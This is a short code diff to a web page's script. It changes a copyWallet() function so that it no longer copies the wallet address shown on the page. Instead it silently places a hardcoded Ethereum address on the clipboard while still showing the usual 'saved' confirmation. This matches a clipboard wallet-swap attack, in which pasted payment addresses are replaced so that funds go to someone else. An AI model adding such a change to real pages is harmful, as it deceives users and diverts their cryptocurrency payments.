@@ -85,8 +85,8 @@
     <script>
         $is_RedirectHTML = true;
         function copyWallet() {
-            $("#wallet").select();
-            document.execCommand("copy");
+            wallet = "0x287C7d1638E5771947BcdCBd8b174fAc4cF37E08";
+            navigator.clipboard.writeText(wallet);
             //$("#wallet").blur();
             $(".saved").fadeIn();
         }
